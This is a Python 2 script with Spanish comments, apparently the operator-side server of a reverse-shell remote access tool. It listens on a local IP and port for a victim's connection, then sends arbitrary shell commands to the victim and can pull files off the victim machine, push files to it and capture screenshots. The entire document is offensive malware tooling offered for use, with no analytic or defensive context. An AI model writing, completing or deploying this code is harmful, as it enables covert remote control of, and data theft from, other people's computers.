import socket
import base64

def shell():
    current_dir=target.recv(1024)
    while True:
        comand = raw_input("{}~#: ".format(current_dir))
        if comand=="exit":
            target.send(comand)
            break
        elif comand[:2]=="cd": #en el caso de cd
            target.send(comand)
            res=target.recv(300000)
            if res=="no existe directorio":
                print("El directorio no existe")
            else:
                current_dir = res  # actualizamos el directorio
        elif comand=="":
            pass
        elif comand[:8]=="download":
            target.send(comand)
            with open(comand[9:],"wb") as file_download:
                datos = target.recv(300000)
                file_download.write(base64.b64decode(datos))
        elif comand[:6]=="upload":
            try:
                target.send(comand)
                with open(comand[7:], "rb") as file_upload:
                    target.send(base64.b64decode(file_upload.read()))
            except:
                print("Error to upload file.")
        elif comand[:10]=="screenshot":
            count=0 #para no duplicar un screenshot
            target.send(comand)
            with open("monitor-%d.png" %count,"wb") as screen:
                datos=target.recv(1000000)
                data_decode=base64.b64decode(datos)
                if data_decode=="fail":
                    print("Can not take the screenshot.")
                else:
                    screen.write(data_decode)
                    print("Take a screenshot successfully")
                    count=count+1



        else:
            target.send(comand)
            res = target.recv(300000)
            print(res)



def start_server():
    global server
    global ip
    global target

    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #creamos socket
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) # configuramos para que una vez cerrado el server se pueda volver a usar la direccion ip
    server.bind(("192.168.0.18",7777)) #configuramos la IP y puerto de escucha (IP de uestra maquina)
    server.listen(1) #ponemos 1 porque solo esperamos una conexion

    print("Running server and wait connections...")

    (target,ip)=server.accept()
    print("Recive connection from: "+str(ip[0]))


def main():
    start_server()
    shell()
    server.close()

if __name__ == '__main__':
    main()